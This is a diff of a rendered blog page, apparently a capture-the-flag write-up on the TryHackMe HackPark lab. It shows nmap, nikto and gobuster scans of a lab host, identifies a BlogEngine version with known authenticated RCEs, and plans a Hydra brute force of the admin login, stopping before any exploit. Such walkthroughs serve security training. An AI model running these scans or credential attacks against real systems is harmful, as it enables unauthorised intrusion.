@@ -1,14 +1,53 @@
-<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta http-equiv=x-ua-compatible content="IE=edge, chrome=1"><title>THM - HackPark without MetaSploit - Masoopy</title><meta name=Description content><meta property="og:title" content="THM - HackPark without MetaSploit"><meta property="og:description" content="Intro New box, new tools, looks like we are going to crack credentials! Let&rsquo;s do it right now.
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta http-equiv=x-ua-compatible content="IE=edge, chrome=1"><title>THM - HackPark without MetaSploit - Masoopy</title><meta name=Description content><meta property="og:title" content="THM - HackPark without MetaSploit"><meta property="og:description" content="Intro New box, new tools, looks like we are going to crack credentials! Let&rsquo;s do it right now.
 Target THM - HackPark
 Recon According to the preview picture of the video, we will face :
  Windows box ; Misc : Hydra, RCE, WinPEAS.  So, probably some credentials cracking with Hydra in order to get initial access, then an RCE to get limited shell, and finally WinPEAS to elevate our privileges to SYSTEM."><meta property="og:type" content="article"><meta property="og:url" content="https://www.masoopy.com/thm-hackpark-without-metasploit/"><meta property="article:published_time" content="2021-02-21T00:00:00+00:00"><meta property="article:modified_time" content="2021-02-21T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="THM - HackPark without MetaSploit"><meta name=twitter:description content="Intro New box, new tools, looks like we are going to crack credentials! Let&rsquo;s do it right now.
 Target THM - HackPark
 Recon According to the preview picture of the video, we will face :
- Windows box ; Misc : Hydra, RCE, WinPEAS.  So, probably some credentials cracking with Hydra in order to get initial access, then an RCE to get limited shell, and finally WinPEAS to elevate our privileges to SYSTEM."><meta name=application-name content="Masoopy"><meta name=apple-mobile-web-app-title content="Masoopy"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://www.masoopy.com/thm-hackpark-without-metasploit/><link rel=prev href=https://www.masoopy.com/htb-nibbles-without-metasploit/><link rel=next href=https://www.masoopy.com/thm-gamezone/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"THM - HackPark without MetaSploit","inLanguage":"en-us","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/www.masoopy.com\/thm-hackpark-without-metasploit\/"},"genre":"posts","keywords":"THM","wordcount":2278,"url":"https:\/\/www.masoopy.com\/thm-hackpark-without-metasploit\/","datePublished":"2021-02-21T00:00:00+00:00","dateModified":"2021-02-21T00:00:00+00:00","license":"2022 Masoopy.com","publisher":{"@type":"Organization","name":"Denis"},"author":{"@type":"Person","name":"Denis"},"description":""}</script></head><body header-desktop header-mobile><script type=text/javascript>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':(''==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:''==='dark'))&&document.body.setAttribute('theme','dark');</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=Masoopy>Masoopy</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>Posts </a><a class=menu-item href=/cheatsheets/>Cheatsheets </a><a class=menu-item href=/tags/>Tags </a><a class=menu-item href=/categories/>Categories </a><a class=menu-item href=/about/>About </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw"></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=Masoopy>Masoopy</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><a class=menu-item href=/posts/>Posts</a><a class=menu-item href=/cheatsheets/>Cheatsheets</a><a class=menu-item href=/tags/>Tags</a><a class=menu-item href=/categories/>Categories</a><a class=menu-item href=/about/>About</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
-<i class="fas fa-adjust fa-fw"></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animated flipInX">THM - HackPark without MetaSploit</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw"></i>Denis</a></span>&nbsp;<span class=post-category>included in <a href=/categories/hacking/><i class="far fa-folder fa-fw"></i>hacking</a>&nbsp;<a href=/categories/write-ups/><i class="far fa-folder fa-fw"></i>write-ups</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2021-02-21>2021-02-21</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;2278 words&nbsp;
-<i class="far fa-clock fa-fw"></i>&nbsp;11 minutes&nbsp;</div></div><div class=featured-image><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/HackPark_Logo.png data-srcset="/images/2021/02/HackPark_Logo.png, /images/2021/02/HackPark_Logo.png 1.5x, /images/2021/02/HackPark_Logo.png 2x" data-sizes=auto alt=/images/2021/02/HackPark_Logo.png title=/images/2021/02/HackPark_Logo.png></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>Contents</span>
-<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#intro>Intro</a></li><li><a href=#target>Target</a></li><li><a href=#recon>Recon</a></li><li><a href=#enum>Enum</a><ul><li><a href=#web-scanning>Web scanning</a></li><li><a href=#cracking-authentication-with-burp>Cracking authentication with Burp</a></li></ul></li><li><a href=#exploitation>Exploitation</a><ul><li><a href=#getting-initial-shell>Getting initial shell</a></li><li><a href=#privesc>PrivEsc</a></li></ul></li><li><a href=#outro>Outro</a></li></ul></nav></div></div><div class=content id=content><h2 id=intro>Intro</h2><p>New box, new tools, looks like we are going to crack credentials! Let&rsquo;s do it right now.</p><h2 id=target>Target</h2><p><a href=https://tryhackme.com/room/hackpark target=_blank rel="noopener noreffer">THM - HackPark</a></p><h2 id=recon>Recon</h2><p>According to the preview picture of the video, we will face :</p><ul><li>Windows box ;</li><li>Misc : Hydra, RCE, WinPEAS.</li></ul><p>So, probably some credentials cracking with Hydra in order to get initial access, then an RCE to get limited shell, and finally <code>WinPEAS</code> to elevate our privileges to <code>SYSTEM</code>. Let&rsquo;s see!</p><h2 id=enum>Enum</h2><p>Let&rsquo;s run our nmap <code>scan</code>. Note that this time we had to add the <code>-Pn</code> switch :</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>sudo nmap -T4 -A -p- -Pn -oA scan $target_ip
-</code></pre></div><div class=highlight><pre class=chroma><code class=language-text data-lang=text>Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower.
+ Windows box ; Misc : Hydra, RCE, WinPEAS.  So, probably some credentials cracking with Hydra in order to get initial access, then an RCE to get limited shell, and finally WinPEAS to elevate our privileges to SYSTEM."><meta name=application-name content="Masoopy"><meta name=apple-mobile-web-app-title content="Masoopy"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://www.masoopy.com/thm-hackpark-without-metasploit/><link rel=prev href=https://www.masoopy.com/htb-nibbles-without-metasploit/><link rel=next href=https://www.masoopy.com/thm-gamezone/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"THM - HackPark without MetaSploit","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/www.masoopy.com\/thm-hackpark-without-metasploit\/"},"genre":"posts","keywords":"THM","wordcount":2730,"url":"https:\/\/www.masoopy.com\/thm-hackpark-without-metasploit\/","datePublished":"2021-02-21T00:00:00+00:00","dateModified":"2021-02-21T00:00:00+00:00","publisher":{"@type":"Organization","name":"Denis G."},"author":{"@type":"Person","name":"Denis G."},"description":""}</script></head><body header-desktop header-mobile><script type=text/javascript>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':(''==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:''==='dark'))&&document.body.setAttribute('theme','dark');</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=Masoopy>Masoopy</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>Posts </a><a class=menu-item href=/cheatsheets/>Cheatsheets </a><a class=menu-item href=/tags/>Tags </a><a class=menu-item href=/categories/>Categories </a><a class=menu-item href=/about/>About </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item theme-switch" title="Changer de Thème"><i class="fas fa-adjust fa-fw"></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=Masoopy>Masoopy</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><a class=menu-item href=/posts/>Posts</a><a class=menu-item href=/cheatsheets/>Cheatsheets</a><a class=menu-item href=/tags/>Tags</a><a class=menu-item href=/categories/>Categories</a><a class=menu-item href=/about/>About</a><a href=javascript:void(0); class="menu-item theme-switch" title="Changer de Thème">
+<i class="fas fa-adjust fa-fw"></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contenu</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animated flipInX">THM - HackPark without MetaSploit</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/about title=Author rel=author class=author><i class="fas fa-user-circle fa-fw"></i>Denis G.</a></span>&nbsp;<span class=post-category>inclus dans <a href=/categories/hacking/><i class="far fa-folder fa-fw"></i>hacking</a>&nbsp;<a href=/categories/write-ups/><i class="far fa-folder fa-fw"></i>write-ups</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2021-02-21>2021-02-21</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;2730 mots&nbsp;
+<i class="far fa-clock fa-fw"></i>&nbsp;13 minutes&nbsp;</div></div><div class=featured-image><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/HackPark_Logo.png data-srcset="/images/2021/02/HackPark_Logo.png, /images/2021/02/HackPark_Logo.png 1.5x, /images/2021/02/HackPark_Logo.png 2x" data-sizes=auto alt=/images/2021/02/HackPark_Logo.png title=/images/2021/02/HackPark_Logo.png></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>Contenu</span>
+<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#intro>Intro</a></li><li><a href=#target>Target</a></li><li><a href=#recon>Recon</a></li><li><a href=#enum>Enum</a><ul><li><a href=#web-scanning>Web scanning</a></li><li><a href=#cracking-authentication-with-burp>Cracking authentication with Burp</a></li></ul></li><li><a href=#exploitation>Exploitation</a><ul><li><a href=#getting-initial-shell>Getting initial shell</a></li><li><a href=#privesc>PrivEsc</a></li></ul></li><li><a href=#outro>Outro</a></li></ul></nav></div></div><div class=content id=content><h2 id=intro>Intro</h2><p>New box, new tools, looks like we are going to crack credentials! Let&rsquo;s do it right now.</p><h2 id=target>Target</h2><p><a href=https://tryhackme.com/room/hackpark target=_blank rel="noopener noreffer">THM - HackPark</a></p><h2 id=recon>Recon</h2><p>According to the preview picture of the video, we will face :</p><ul><li>Windows box ;</li><li>Misc : Hydra, RCE, WinPEAS.</li></ul><p>So, probably some credentials cracking with Hydra in order to get initial access, then an RCE to get limited shell, and finally <code>WinPEAS</code> to elevate our privileges to <code>SYSTEM</code>. Let&rsquo;s see!</p><h2 id=enum>Enum</h2><p>Let&rsquo;s run our nmap <code>scan</code>. Note that this time we had to add the <code>-Pn</code> switch :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-text data-lang=text>sudo nmap -T4 -A -p- -Pn -oA scan $target_ip
+</code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-text data-lang=text>Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-21 09:25 CET
 Nmap scan report for 10.10.144.161
 Host is up (0.033s latency).
@@ -46,8 +85,36 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 113.95 seconds
-</code></pre></div><p>We discovered only two services :</p><ul><li>Web server on 80/tcp : Microsoft IIS 8.5</li><li>RDP.</li></ul><h3 id=web-scanning>Web scanning</h3><p>Now, we&rsquo;ll run two longs scans, dedicated to websites. During those scans, we will manually browse to our website, with <code>Burp</code> proxy. I&rsquo;ll talk about this right below the scans output.</p><p>First scan :</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>nikto -h http://10.10.144.161
-</code></pre></div><div class=highlight><pre class=chroma><code class=language-text data-lang=text>- Nikto v2.1.6
+</code></pre></td></tr></table></div></div><p>We discovered only two services :</p><ul><li>Web server on 80/tcp : Microsoft IIS 8.5</li><li>RDP.</li></ul><h3 id=web-scanning>Web scanning</h3><p>Now, we&rsquo;ll run two longs scans, dedicated to websites. During those scans, we will manually browse to our website, with <code>Burp</code> proxy. I&rsquo;ll talk about this right below the scans output.</p><p>First scan :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-text data-lang=text>nikto -h http://10.10.144.161
+</code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-text data-lang=text>- Nikto v2.1.6
 ---------------------------------------------------------------------------
 + Target IP:          10.10.144.161
 + Target Hostname:    10.10.144.161
@@ -74,8 +141,390 @@ Nmap done: 1 IP address (1 host up) scanned in 113.95 seconds
 + End Time:           2021-02-21 09:37:29 (GMT1) (486 seconds)
 ---------------------------------------------------------------------------
 + 1 host(s) tested
-</code></pre></div><p>Second scan :</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>gobuster dir -u http://10.10.144.161 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 200 -x .asp,aspx
-</code></pre></div><div class=highlight><pre class=chroma><code class=language-text data-lang=text>===============================================================
+</code></pre></td></tr></table></div></div><p>Second scan :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-text data-lang=text>gobuster dir -u http://10.10.144.161 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 200 -x .asp,aspx
+</code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span><span class=lnt>120
+</span><span class=lnt>121
+</span><span class=lnt>122
+</span><span class=lnt>123
+</span><span class=lnt>124
+</span><span class=lnt>125
+</span><span class=lnt>126
+</span><span class=lnt>127
+</span><span class=lnt>128
+</span><span class=lnt>129
+</span><span class=lnt>130
+</span><span class=lnt>131
+</span><span class=lnt>132
+</span><span class=lnt>133
+</span><span class=lnt>134
+</span><span class=lnt>135
+</span><span class=lnt>136
+</span><span class=lnt>137
+</span><span class=lnt>138
+</span><span class=lnt>139
+</span><span class=lnt>140
+</span><span class=lnt>141
+</span><span class=lnt>142
+</span><span class=lnt>143
+</span><span class=lnt>144
+</span><span class=lnt>145
+</span><span class=lnt>146
+</span><span class=lnt>147
+</span><span class=lnt>148
+</span><span class=lnt>149
+</span><span class=lnt>150
+</span><span class=lnt>151
+</span><span class=lnt>152
+</span><span class=lnt>153
+</span><span class=lnt>154
+</span><span class=lnt>155
+</span><span class=lnt>156
+</span><span class=lnt>157
+</span><span class=lnt>158
+</span><span class=lnt>159
+</span><span class=lnt>160
+</span><span class=lnt>161
+</span><span class=lnt>162
+</span><span class=lnt>163
+</span><span class=lnt>164
+</span><span class=lnt>165
+</span><span class=lnt>166
+</span><span class=lnt>167
+</span><span class=lnt>168
+</span><span class=lnt>169
+</span><span class=lnt>170
+</span><span class=lnt>171
+</span><span class=lnt>172
+</span><span class=lnt>173
+</span><span class=lnt>174
+</span><span class=lnt>175
+</span><span class=lnt>176
+</span><span class=lnt>177
+</span><span class=lnt>178
+</span><span class=lnt>179
+</span><span class=lnt>180
+</span><span class=lnt>181
+</span><span class=lnt>182
+</span><span class=lnt>183
+</span><span class=lnt>184
+</span><span class=lnt>185
+</span><span class=lnt>186
+</span><span class=lnt>187
+</span><span class=lnt>188
+</span><span class=lnt>189
+</span><span class=lnt>190
+</span><span class=lnt>191
+</span><span class=lnt>192
+</span><span class=lnt>193
+</span><span class=lnt>194
+</span><span class=lnt>195
+</span><span class=lnt>196
+</span><span class=lnt>197
+</span><span class=lnt>198
+</span><span class=lnt>199
+</span><span class=lnt>200
+</span><span class=lnt>201
+</span><span class=lnt>202
+</span><span class=lnt>203
+</span><span class=lnt>204
+</span><span class=lnt>205
+</span><span class=lnt>206
+</span><span class=lnt>207
+</span><span class=lnt>208
+</span><span class=lnt>209
+</span><span class=lnt>210
+</span><span class=lnt>211
+</span><span class=lnt>212
+</span><span class=lnt>213
+</span><span class=lnt>214
+</span><span class=lnt>215
+</span><span class=lnt>216
+</span><span class=lnt>217
+</span><span class=lnt>218
+</span><span class=lnt>219
+</span><span class=lnt>220
+</span><span class=lnt>221
+</span><span class=lnt>222
+</span><span class=lnt>223
+</span><span class=lnt>224
+</span><span class=lnt>225
+</span><span class=lnt>226
+</span><span class=lnt>227
+</span><span class=lnt>228
+</span><span class=lnt>229
+</span><span class=lnt>230
+</span><span class=lnt>231
+</span><span class=lnt>232
+</span><span class=lnt>233
+</span><span class=lnt>234
+</span><span class=lnt>235
+</span><span class=lnt>236
+</span><span class=lnt>237
+</span><span class=lnt>238
+</span><span class=lnt>239
+</span><span class=lnt>240
+</span><span class=lnt>241
+</span><span class=lnt>242
+</span><span class=lnt>243
+</span><span class=lnt>244
+</span><span class=lnt>245
+</span><span class=lnt>246
+</span><span class=lnt>247
+</span><span class=lnt>248
+</span><span class=lnt>249
+</span><span class=lnt>250
+</span><span class=lnt>251
+</span><span class=lnt>252
+</span><span class=lnt>253
+</span><span class=lnt>254
+</span><span class=lnt>255
+</span><span class=lnt>256
+</span><span class=lnt>257
+</span><span class=lnt>258
+</span><span class=lnt>259
+</span><span class=lnt>260
+</span><span class=lnt>261
+</span><span class=lnt>262
+</span><span class=lnt>263
+</span><span class=lnt>264
+</span><span class=lnt>265
+</span><span class=lnt>266
+</span><span class=lnt>267
+</span><span class=lnt>268
+</span><span class=lnt>269
+</span><span class=lnt>270
+</span><span class=lnt>271
+</span><span class=lnt>272
+</span><span class=lnt>273
+</span><span class=lnt>274
+</span><span class=lnt>275
+</span><span class=lnt>276
+</span><span class=lnt>277
+</span><span class=lnt>278
+</span><span class=lnt>279
+</span><span class=lnt>280
+</span><span class=lnt>281
+</span><span class=lnt>282
+</span><span class=lnt>283
+</span><span class=lnt>284
+</span><span class=lnt>285
+</span><span class=lnt>286
+</span><span class=lnt>287
+</span><span class=lnt>288
+</span><span class=lnt>289
+</span><span class=lnt>290
+</span><span class=lnt>291
+</span><span class=lnt>292
+</span><span class=lnt>293
+</span><span class=lnt>294
+</span><span class=lnt>295
+</span><span class=lnt>296
+</span><span class=lnt>297
+</span><span class=lnt>298
+</span><span class=lnt>299
+</span><span class=lnt>300
+</span><span class=lnt>301
+</span><span class=lnt>302
+</span><span class=lnt>303
+</span><span class=lnt>304
+</span><span class=lnt>305
+</span><span class=lnt>306
+</span><span class=lnt>307
+</span><span class=lnt>308
+</span><span class=lnt>309
+</span><span class=lnt>310
+</span><span class=lnt>311
+</span><span class=lnt>312
+</span><span class=lnt>313
+</span><span class=lnt>314
+</span><span class=lnt>315
+</span><span class=lnt>316
+</span><span class=lnt>317
+</span><span class=lnt>318
+</span><span class=lnt>319
+</span><span class=lnt>320
+</span><span class=lnt>321
+</span><span class=lnt>322
+</span><span class=lnt>323
+</span><span class=lnt>324
+</span><span class=lnt>325
+</span><span class=lnt>326
+</span><span class=lnt>327
+</span><span class=lnt>328
+</span><span class=lnt>329
+</span><span class=lnt>330
+</span><span class=lnt>331
+</span><span class=lnt>332
+</span><span class=lnt>333
+</span><span class=lnt>334
+</span><span class=lnt>335
+</span><span class=lnt>336
+</span><span class=lnt>337
+</span><span class=lnt>338
+</span><span class=lnt>339
+</span><span class=lnt>340
+</span><span class=lnt>341
+</span><span class=lnt>342
+</span><span class=lnt>343
+</span><span class=lnt>344
+</span><span class=lnt>345
+</span><span class=lnt>346
+</span><span class=lnt>347
+</span><span class=lnt>348
+</span><span class=lnt>349
+</span><span class=lnt>350
+</span><span class=lnt>351
+</span><span class=lnt>352
+</span><span class=lnt>353
+</span><span class=lnt>354
+</span><span class=lnt>355
+</span><span class=lnt>356
+</span><span class=lnt>357
+</span><span class=lnt>358
+</span><span class=lnt>359
+</span><span class=lnt>360
+</span><span class=lnt>361
+</span><span class=lnt>362
+</span><span class=lnt>363
+</span><span class=lnt>364
+</span><span class=lnt>365
+</span><span class=lnt>366
+</span><span class=lnt>367
+</span><span class=lnt>368
+</span><span class=lnt>369
+</span><span class=lnt>370
+</span><span class=lnt>371
+</span><span class=lnt>372
+</span><span class=lnt>373
+</span><span class=lnt>374
+</span><span class=lnt>375
+</span><span class=lnt>376
+</span><span class=lnt>377
+</span><span class=lnt>378
+</span><span class=lnt>379
+</span><span class=lnt>380
+</span><span class=lnt>381
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-text data-lang=text>===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
 ===============================================================
@@ -456,8 +905,11 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
 ===============================================================
 2021/02/21 09:36:17 Finished
 ===============================================================
-</code></pre></div><p>Checking <code>searchsploit</code> for vuln on <code>IIS 8.5</code> won&rsquo;t reveal anything.</p><p>In the meantime, manual browsing to the website tells us it is a blog, and it is running on <code>BlogEngine.NET</code> which seems to be an Open source blogging platform for ASP / Windows platforms.</p><p>Using <code>searchsploit</code>, we&rsquo;ll discover that some versions are vulnerable to various stuff (including RCE), however we do not know yet, our version.</p><p>However, by looking at the source code of the main page, we&rsquo;ll see that we are using <code>BlogEngine 3.3.6.0</code> :</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/HackPark_Blog_Version.png data-srcset="/images/2021/02/HackPark_Blog_Version.png, /images/2021/02/HackPark_Blog_Version.png 1.5x, /images/2021/02/HackPark_Blog_Version.png 2x" data-sizes=auto alt=/images/2021/02/HackPark_Blog_Version.png title="HackPark Blog Version"></p><p>This confirms that our target is vulnerable to RCEs! By reading the RCEs on <a href=https://www.exploit-db.com/ target=_blank rel="noopener noreffer">Exploit-DB</a>, we see that all of them require access to the admin panel, they are Authenticated RCE. I guess, this is where <code>Hydra</code> will come useful and the <code>http://10.10.144.161/admin</code> URL we found during our previous scans.</p><h3 id=cracking-authentication-with-burp>Cracking authentication with Burp</h3><p>By reading the &ldquo;Get Started with BlogEngine&rdquo;, we learn that default credentials are <code>admin</code> // <code>admin</code>. However, it doesn&rsquo;t work. We will assume that the password has been changed but not the user!</p><p>Before running <code>Hydra</code>, we need to gather URL parameter, I like to use <code>Burp</code> proxy history in order to do so 